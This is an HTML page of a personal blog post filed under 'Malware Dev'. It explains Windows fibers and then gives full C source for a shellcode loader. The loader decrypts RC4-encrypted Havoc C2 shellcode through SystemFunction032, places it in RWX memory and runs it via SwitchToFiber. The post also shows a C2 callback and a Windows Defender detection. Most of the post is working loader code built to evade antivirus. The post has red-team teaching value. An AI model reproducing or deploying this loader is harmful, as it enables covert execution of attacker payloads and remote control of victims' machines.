<!DOCTYPE html>
<html lang="en">

<head>
  <title>
  Fiber Injection ¬∑ Aft3r D4rk
</title>
  <link rel="icon" href="/logo-dark.svg" type="image/x-icon">

<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="color-scheme" content="light dark">




<meta name="author" content="Aft3r D4rk">
<meta name="description" content="We all know threads ‚Äî those small, poor workers who execute code for a process. A thread is the smallest unit of execution within a process.
But have you ever heard of something called a fiber?
No, I‚Äôm not talking about the dietary stuff you get from fruits and vegetables.
So what on earth am I talking about?

what is a fiber ?
So Fibers are a unit of execution same as threads BUT it is manually scheduled by the application here is some facts about them :">
<meta name="keywords" content="blog,developer,personal">



  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Fiber Injection">
  <meta name="twitter:description" content="We all know threads ‚Äî those small, poor workers who execute code for a process. A thread is the smallest unit of execution within a process.
But have you ever heard of something called a fiber?
No, I‚Äôm not talking about the dietary stuff you get from fruits and vegetables.
So what on earth am I talking about?
what is a fiber ?So Fibers are a unit of execution same as threads BUT it is manually scheduled by the application here is some facts about them :">

<meta property="og:url" content="https://Aft3rD4rk.gihub.io/posts/fiber-injection/">
  <meta property="og:site_name" content="Aft3r D4rk">
  <meta property="og:title" content="Fiber Injection">
  <meta property="og:description" content="We all know threads ‚Äî those small, poor workers who execute code for a process. A thread is the smallest unit of execution within a process.
But have you ever heard of something called a fiber?
No, I‚Äôm not talking about the dietary stuff you get from fruits and vegetables.
So what on earth am I talking about?
what is a fiber ?So Fibers are a unit of execution same as threads BUT it is manually scheduled by the application here is some facts about them :">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2020-02-11T22:47:27+10:00">
    <meta property="article:modified_time" content="2020-02-11T22:47:27+10:00">




<link rel="canonical" href="https://Aft3rD4rk.gihub.io/posts/fiber-injection/">


<link rel="preload" href="/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
<link rel="preload" href="/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
<link rel="preload" href="/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>


  
  
  <link rel="stylesheet" href="/css/coder.min.6445a802b9389c9660e1b07b724dcf5718b1065ed2d71b4eeaf981cc7cc5fc46.css" integrity="sha256-ZEWoArk4nJZg4bB7ck3PVxixBl7S1xtO6vmBzHzF/EY=" crossorigin="anonymous" media="screen" />






  
    
    
    <link rel="stylesheet" href="/css/coder-dark.min.a00e6364bacbc8266ad1cc81230774a1397198f8cfb7bcba29b7d6fcb54ce57f.css" integrity="sha256-oA5jZLrLyCZq0cyBIwd0oTlxmPjPt7y6KbfW/LVM5X8=" crossorigin="anonymous" media="screen" />
  



 
  
    
    <link rel="stylesheet" href="/css/custom.min.5f802db09df264a56be6981e80620004f955d9f22cf4aa655efd7bc70660cf73.css" integrity="sha256-X4AtsJ3yZKVr5pgegGIABPlV2fIs9KplXv17xwZgz3M=" crossorigin="anonymous" media="screen" />
  





<link rel="icon" type="image/svg+xml" href="#ZgotmplZ" sizes="any">
<link rel="icon" type="image/png" href="#ZgotmplZ" sizes="32x32">
<link rel="icon" type="image/png" href="#ZgotmplZ" sizes="16x16">

<link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">

<link rel="manifest" href="/site.webmanifest">
<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">









</head>






<body class="preload-transitions colorscheme-auto">
  
<div class="float-container">
    <a id="dark-mode-toggle" class="colorscheme-toggle">
        <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
    </a>
</div>


  <main class="wrapper">
    <nav class="navigation">
  <section class="container">
    
    <a class="navigation-title" href="https://aft3rd4rk.github.io/">
  <strong>Aft3r D4rk</strong>
</a>
    
    
      <input type="checkbox" id="menu-toggle" />
      <label class="menu-button float-right" for="menu-toggle">
        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
      </label>
      <ul class="navigation-list">
         
          
            <li class="navigation-item">
              <a class="navigation-link " href="/posts/">Blog</a>
            </li>
          
            <li class="navigation-item">
              <a class="navigation-link " href="/about/">About</a>
            </li>
          
        
        
      </ul>
    
  </section>
</nav>


    <div class="content">
      
  <section class="container post">
    <article>
      <header>
        <div class="post-title">
          <h1 class="title">
            <a class="title-link" href="https://Aft3rD4rk.gihub.io/posts/fiber-injection/">
              Fiber Injection
            </a>
          </h1>
        </div>
        <div class="post-meta">
          <div class="date">
            <span class="posted-on">
              <i class="fa-solid fa-calendar" aria-hidden="true"></i>
              <time datetime="2020-02-11T22:47:27&#43;10:00">
                February 11, 2020
              </time>
            </span>
            <span class="reading-time">
              <i class="fa-solid fa-clock" aria-hidden="true"></i>
              5-minute read
            </span>
          </div>
          <div class="authors">
  <i class="fa-solid fa-user" aria-hidden="true"></i>
    <a href="/authors/bugs-bunny/">Bugs Bunny</a></div>

          <div class="categories">
  <i class="fa-solid fa-folder" aria-hidden="true"></i>
    <a href="/categories/malware-dev/">Malware Dev</a></div>

          
        </div>
      </header>

      <div class="post-content">
        
        <p>We all know threads ‚Äî those small, poor workers who execute code for a process. A thread is the smallest unit of execution within a process.</p>
<p>But have you ever heard of something called a fiber?</p>
<p>No, I‚Äôm not talking about the dietary stuff you get from fruits and vegetables.</p>
<p>So what on earth am I talking about?</p>
<meme image >
<H1>what is a fiber ?</H1>
<p>So Fibers are a unit of execution same as threads BUT it is manually scheduled by the application here is some facts about them :</p>
<ul>
<li>User-mode only: Fibers are controlled entirely from user mode so they‚Äôre invisible to the kernel. That means you, the developer, control when they run.</li>
<li>One thread can run many fibers: A single thread can create multiple fibers and switch between them whenever it wants using the WinAPI function SwitchToFiber</li>
<li>No parallelism unless you do the work: Fibers do not run in parallel on multi-core CPUs unless you explicitly run them on multiple threads.</li>
<li>Lightweight and efficient: Fibers consume very few system resources. They&rsquo;re much cheaper and lighter than threads when it comes to executing code.</li>
</ul>
<p>They&rsquo;re no longer widely used nowadays ‚Äî because who on earth wants to create an application and do all the heavy lifting themselves, like managing code execution, scheduling, creating threads for parallelism, and manually switching between fibers?</p>
<p>ü§ì‚òùÔ∏è:&ldquo;Actually, I use fibers when developing applications.&rdquo;</p>
<p>Ok they are rarely used today mr Actually.</p>
<H1>Fiber injection </H1>
<p>Fiber injection is basically making the fiber execute our shellcode, instead of using threads like the <a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread"  class="external-link" target="_blank" rel="noopener">CreateThread</a> WinAPI.</p>
<p>To start our journey, I‚Äôm already one step ahead ‚Äî my Havoc C2 is up and waiting:</p>
<p><img src="/images/fiber-injection/havoc-pre.jpg" alt="ARE U BLIND?  NOT MY FAULT THE IMAGE IS NOT LOADING"
style="border-radius: 0 !important; clip-path: none !important; width: auto; height: auto;"></p>
<p>Note: My shellcode is encrypted with RC4. I used <a href="https://github.com/NUL0x4C/HellShell"  class="external-link" target="_blank" rel="noopener">Hellshell</a> to encrypt it for me.</p>
<p>Everything will be done inside the main function ‚Äî though you could move this into a separate function if you want (I‚Äôm just too lazy to bother right now).</p>
<p>First, we need to convert the current thread into a fiber. You can‚Äôt create a fiber and switch to it unless the calling thread is already a fiber. That‚Äôs why we convert the current thread using <a href="https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-convertthreadtofiber"  class="external-link" target="_blank" rel="noopener">ConvertThreadToFiber</a>.</p>
<p>After that, I‚Äôll allocate memory in the current process to store my shellcode. And since I‚Äôm lazy, I‚Äôm going to directly set the protection to PAGE_EXECUTE_READWRITE during VirtualAlloc, instead of doing it the ‚Äúproper‚Äù way with <a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect"  class="external-link" target="_blank" rel="noopener">VirtualProtect</a> and changing the memory protection afterward.</p>
<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>	PVOID fiber1 <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#d2a8ff;font-weight:bold">ConvertThreadToFiber</span>(NULL);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#ff7b72">if</span> (fiber1 <span style="color:#ff7b72;font-weight:bold">==</span> NULL) {
</span></span><span style="display:flex;"><span>		<span style="color:#d2a8ff;font-weight:bold">printf</span>(<span style="color:#a5d6ff">&#34;[-] Failed to convert thread to fiber.</span><span style="color:#79c0ff">\n</span><span style="color:#a5d6ff">&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#ff7b72">return</span> <span style="color:#a5d6ff">1</span>;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#8b949e;font-style:italic">// allocating memory for the shellcode
</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"></span>
</span></span><span style="display:flex;"><span>	PVOID address <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#d2a8ff;font-weight:bold">VirtualAlloc</span>(<span style="color:#a5d6ff">0</span>, <span style="color:#ff7b72">sizeof</span>(Rc4CipherText), MEM_COMMIT <span style="color:#ff7b72;font-weight:bold">|</span> MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span></span></code></pre></div>
<p>Then we‚Äôll create a new fiber that points to the memory we allocated. So when we switch to it, it‚Äôll start executing the code at that memory address.</p>
<p>Rc4EncryptionViSystemFunc032 is just a function I use to decrypt the Havoc shellcode. After decrypting it, I‚Äôll simply copy the shellcode into the allocated memory.</p>
<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>    <span style="color:#8b949e;font-style:italic">// creating another fiber
</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"></span>	PVOID fiber2 <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#d2a8ff;font-weight:bold">CreateFiber</span>(NULL, (LPFIBER_START_ROUTINE)address, NULL);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#ff7b72">if</span> (<span style="color:#ff7b72;font-weight:bold">!</span>fiber2) {
</span></span><span style="display:flex;"><span>		<span style="color:#d2a8ff;font-weight:bold">printf</span>(<span style="color:#a5d6ff">&#34;[-] Failed to create fiber.</span><span style="color:#79c0ff">\n</span><span style="color:#a5d6ff">&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#ff7b72">return</span> <span style="color:#a5d6ff">1</span>;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#8b949e;font-style:italic">// decrypting the shellcode
</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"></span>	<span style="color:#d2a8ff;font-weight:bold">Rc4EncryptionViSystemFunc032</span>(Rc4Key, Rc4CipherText, <span style="color:#ff7b72">sizeof</span>(Rc4Key), <span style="color:#ff7b72">sizeof</span>(Rc4CipherText));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#8b949e;font-style:italic">// copying the shellcode into the allocated memory 
</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"></span>	<span style="color:#d2a8ff;font-weight:bold">memcpy</span>(address, Rc4CipherText, <span style="color:#ff7b72">sizeof</span>(Rc4CipherText));</span></span></code></pre></div>
<p>Lastly, we‚Äôll just switch to the fiber2 we created. Once you switch to the fiber, it will execute the shellcode.</p>
<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span> 	<span style="color:#8b949e;font-style:italic">// when switching the fiber 2 it will start executing the shellcode that&#39;s stored in the allocated memory 
</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"></span>	<span style="color:#d2a8ff;font-weight:bold">SwitchToFiber</span>(fiber2);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#ff7b72">return</span> <span style="color:#a5d6ff">0</span>;</span></span></code></pre></div>
<p>The full code :</p>
<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#8b949e;font-weight:bold;font-style:italic">#include</span> <span style="color:#8b949e;font-weight:bold;font-style:italic">&lt;windows.h&gt;</span><span style="color:#8b949e;font-weight:bold;font-style:italic">
</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-weight:bold;font-style:italic">#include</span> <span style="color:#8b949e;font-weight:bold;font-style:italic">&lt;stdio.h&gt;</span><span style="color:#8b949e;font-weight:bold;font-style:italic">
</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-weight:bold;font-style:italic"></span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">// this is what SystemFunction032 function take as a parameter
</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"></span><span style="color:#ff7b72">typedef</span> <span style="color:#ff7b72">struct</span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	DWORD	Length;
</span></span><span style="display:flex;"><span>	DWORD	MaximumLength;
</span></span><span style="display:flex;"><span>	PVOID	Buffer;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>} USTRING;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">// defining how does the function look - more on this structure in the api hashing part
</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"></span><span style="color:#ff7b72">typedef</span> <span style="color:#d2a8ff;font-weight:bold">NTSTATUS</span>(NTAPI<span style="color:#ff7b72;font-weight:bold">*</span> fnSystemFunction032)(
</span></span><span style="display:flex;"><span>	<span style="color:#ff7b72">struct</span> USTRING<span style="color:#ff7b72;font-weight:bold">*</span> Img,
</span></span><span style="display:flex;"><span>	<span style="color:#ff7b72">struct</span> USTRING<span style="color:#ff7b72;font-weight:bold">*</span> Key
</span></span><span style="display:flex;"><span>	);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>BOOL <span style="color:#d2a8ff;font-weight:bold">Rc4EncryptionViSystemFunc032</span>(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#8b949e;font-style:italic">// the return of SystemFunction032
</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"></span>	NTSTATUS	STATUS <span style="color:#ff7b72;font-weight:bold">=</span> NULL;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#8b949e;font-style:italic">// making 2 USTRING variables, 1 passed as key and one passed as the block of data to encrypt/decrypt
</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"></span>	USTRING		Key <span style="color:#ff7b72;font-weight:bold">=</span> { .Buffer <span style="color:#ff7b72;font-weight:bold">=</span> pRc4Key, 		.Length <span style="color:#ff7b72;font-weight:bold">=</span> dwRc4KeySize,		.MaximumLength <span style="color:#ff7b72;font-weight:bold">=</span> dwRc4KeySize },
</span></span><span style="display:flex;"><span>		Img <span style="color:#ff7b72;font-weight:bold">=</span> { .Buffer <span style="color:#ff7b72;font-weight:bold">=</span> pPayloadData, 	.Length <span style="color:#ff7b72;font-weight:bold">=</span> sPayloadSize,		.MaximumLength <span style="color:#ff7b72;font-weight:bold">=</span> sPayloadSize };
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#8b949e;font-style:italic">// since SystemFunction032 is exported from Advapi32.dll, we load it Advapi32 into the prcess,
</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"></span>	<span style="color:#8b949e;font-style:italic">// and using its return as the hModule parameter in GetProcAddress
</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"></span>	fnSystemFunction032 SystemFunction032 <span style="color:#ff7b72;font-weight:bold">=</span> (fnSystemFunction032)<span style="color:#d2a8ff;font-weight:bold">GetProcAddress</span>(<span style="color:#d2a8ff;font-weight:bold">LoadLibraryA</span>(<span style="color:#a5d6ff">&#34;Advapi32&#34;</span>), <span style="color:#a5d6ff">&#34;SystemFunction032&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#8b949e;font-style:italic">// if SystemFunction032 calls failed it will return non zero value
</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"></span>	<span style="color:#ff7b72">if</span> ((STATUS <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#d2a8ff;font-weight:bold">SystemFunction032</span>(<span style="color:#ff7b72;font-weight:bold">&amp;</span>Img, <span style="color:#ff7b72;font-weight:bold">&amp;</span>Key)) <span style="color:#ff7b72;font-weight:bold">!=</span> <span style="color:#a5d6ff">0x0</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#d2a8ff;font-weight:bold">printf</span>(<span style="color:#a5d6ff">&#34;[!] SystemFunction032 FAILED With Error : 0x%0.8X</span><span style="color:#79c0ff">\n</span><span style="color:#a5d6ff">&#34;</span>, STATUS);
</span></span><span style="display:flex;"><span>		<span style="color:#ff7b72">return</span> FALSE;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#ff7b72">return</span> TRUE;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">// my encrypted shellcode it&#39;s huge so i won&#39;t fill half the blog showing it 
</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"></span><span style="color:#ff7b72">unsigned</span> <span style="color:#ff7b72">char</span> Rc4CipherText[] <span style="color:#ff7b72;font-weight:bold">=</span> {
</span></span><span style="display:flex;"><span>	<span style="color:#a5d6ff">0xB0</span>, <span style="color:#a5d6ff">0x94</span>, <span style="color:#a5d6ff">0xE1</span>, <span style="color:#a5d6ff">0x89</span>, <span style="color:#a5d6ff">0x90</span>, <span style="color:#a5d6ff">0xE0</span>, <span style="color:#a5d6ff">0x5B</span>, <span style="color:#a5d6ff">0xE7</span>, .....} 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff7b72">unsigned</span> <span style="color:#ff7b72">char</span> Rc4Key[] <span style="color:#ff7b72;font-weight:bold">=</span> {
</span></span><span style="display:flex;"><span>	<span style="color:#a5d6ff">0x90</span>, <span style="color:#a5d6ff">0x4B</span>, <span style="color:#a5d6ff">0x51</span>, <span style="color:#a5d6ff">0x4D</span>, <span style="color:#a5d6ff">0x24</span>, <span style="color:#a5d6ff">0x6A</span>, <span style="color:#a5d6ff">0xA4</span>, <span style="color:#a5d6ff">0x83</span>, <span style="color:#a5d6ff">0x36</span>, <span style="color:#a5d6ff">0x5D</span>, <span style="color:#a5d6ff">0x96</span>, <span style="color:#a5d6ff">0x8F</span>, <span style="color:#a5d6ff">0xA4</span>, <span style="color:#a5d6ff">0x96</span>, <span style="color:#a5d6ff">0x9D</span>, <span style="color:#a5d6ff">0xA4</span> };
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   <span style="color:#ff7b72">int</span> <span style="color:#d2a8ff;font-weight:bold">main</span>() {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#8b949e;font-style:italic">// converts curretn thread to a fiber 
</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"></span>
</span></span><span style="display:flex;"><span>	PVOID fiber1 <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#d2a8ff;font-weight:bold">ConvertThreadToFiber</span>(NULL);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#ff7b72">if</span> (fiber1 <span style="color:#ff7b72;font-weight:bold">==</span> NULL) {
</span></span><span style="display:flex;"><span>		<span style="color:#d2a8ff;font-weight:bold">printf</span>(<span style="color:#a5d6ff">&#34;[-] Failed to convert thread to fiber.</span><span style="color:#79c0ff">\n</span><span style="color:#a5d6ff">&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#ff7b72">return</span> <span style="color:#a5d6ff">1</span>;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#8b949e;font-style:italic">// allocating memory for the shellcode
</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"></span>
</span></span><span style="display:flex;"><span>	PVOID address <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#d2a8ff;font-weight:bold">VirtualAlloc</span>(<span style="color:#a5d6ff">0</span>, <span style="color:#ff7b72">sizeof</span>(Rc4CipherText), MEM_COMMIT <span style="color:#ff7b72;font-weight:bold">|</span> MEM_RESERVE, PAGE_EXECUTE_READWRITE);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#8b949e;font-style:italic">// creating another fiber 
</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"></span>
</span></span><span style="display:flex;"><span>	PVOID fiber2 <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#d2a8ff;font-weight:bold">CreateFiber</span>(NULL, (LPFIBER_START_ROUTINE)address, NULL);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#ff7b72">if</span> (<span style="color:#ff7b72;font-weight:bold">!</span>fiber2) {
</span></span><span style="display:flex;"><span>		<span style="color:#d2a8ff;font-weight:bold">printf</span>(<span style="color:#a5d6ff">&#34;[-] Failed to create fiber.</span><span style="color:#79c0ff">\n</span><span style="color:#a5d6ff">&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#ff7b72">return</span> <span style="color:#a5d6ff">1</span>;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#8b949e;font-style:italic">// decrypting the shellcode
</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"></span>	<span style="color:#d2a8ff;font-weight:bold">Rc4EncryptionViSystemFunc032</span>(Rc4Key, Rc4CipherText, <span style="color:#ff7b72">sizeof</span>(Rc4Key), <span style="color:#ff7b72">sizeof</span>(Rc4CipherText));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#8b949e;font-style:italic">// copying the shellcode into the allocated memory 
</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"></span>	<span style="color:#d2a8ff;font-weight:bold">memcpy</span>(address, Rc4CipherText, <span style="color:#ff7b72">sizeof</span>(Rc4CipherText));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#8b949e;font-style:italic">// when switching the fiber 2 it will start executing the shellcode that&#39;s stored in the allocated memory 
</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"></span>	<span style="color:#d2a8ff;font-weight:bold">SwitchToFiber</span>(fiber2);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#ff7b72">return</span> <span style="color:#a5d6ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>}</span></span></code></pre></div>
<p>After execution, we got a connection back to our Havoc C2:</p>
<p><img src="/images/fiber-injection/havoc-connect.jpg" alt="ARE U BLIND?  NOT MY FAULT THE IMAGE IS NOT LOADING"
style="border-radius: 0 !important; clip-path: none !important; width: auto; height: auto;"></p>
<p>Note: Even with RC4 encryption, Windows Defender ruined the moment and detected the shellcode anyway.</p>
<p><img src="/images/fiber-injection/windef.jpg" alt="ARE U BLIND?  NOT MY FAULT THE IMAGE IS NOT LOADING"
style="border-radius: 0 !important; clip-path: none !important; width: auto; height: auto;"></p>
<p><img src="/images/fiber-injection/windef-meme.jpg" alt="ARE U BLIND?  NOT MY FAULT THE IMAGE IS NOT LOADING"
style="border-radius: 0 !important; clip-path: none !important; width: auto; height: auto;"></p>
<p>Anyway, that‚Äôs all folks. I need to go eat instead of writing stuff that gets detected by Windows Defender.</p>
<p><img src="/images/fiber-injection/ending.jpg" alt="ARE U BLIND? NOT MY FAULT THE IMAGE IS NOT LOADING"
style="border-radius: 0 !important; clip-path: none !important; width: auto; height: auto;"></p>
<p>References:</p>
<ul>
<li><a href="https://devblogs.microsoft.com/oldnewthing/20191011-00/?p=102989"  class="external-link" target="_blank" rel="noopener">https://devblogs.microsoft.com/oldnewthing/20191011-00/?p=102989</a></li>
<li><a href="https://learn.microsoft.com/en-us/windows/win32/procthread/fibers"  class="external-link" target="_blank" rel="noopener">https://learn.microsoft.com/en-us/windows/win32/procthread/fibers</a></li>
<li><a href="https://github.com/Kudaes/Fiber"  class="external-link" target="_blank" rel="noopener">https://github.com/Kudaes/Fiber</a></li>
</ul>

      </div>


      <footer>
        


        
        
        
        
        
        
        
      </footer>
    </article>

    
  </section>

    </div>

    <footer class="footer">
  <section class="container">
    ¬©
    
      2019 -
    
    2025
     Aft3r D4rk 
    
  </section>
</footer>


<script>
  document.addEventListener("DOMContentLoaded", function () {
    const el = document.getElementById("typed-name");
    const text = el.getAttribute("data-typed");
    let i = 0;
    function type() {
      if (i < text.length) {
        el.innerHTML += text.charAt(i);
        i++;
        setTimeout(type, 150);
      }
    }
    type();
  });
</script>


<script>
  document.addEventListener("DOMContentLoaded", function () {
    const el = document.getElementById("typed-whoami");
    const text = el.getAttribute("data-typed");
    let i = 0;
    function type() {
      if (i < text.length) {
        el.textContent += text.charAt(i);
        i++;
        setTimeout(type, 130);
      }
    }
    type();
  });
</script>
  </main>

  

  
  
  <script src="/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js" integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script>
  

  

  


  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  
</body>
</html>
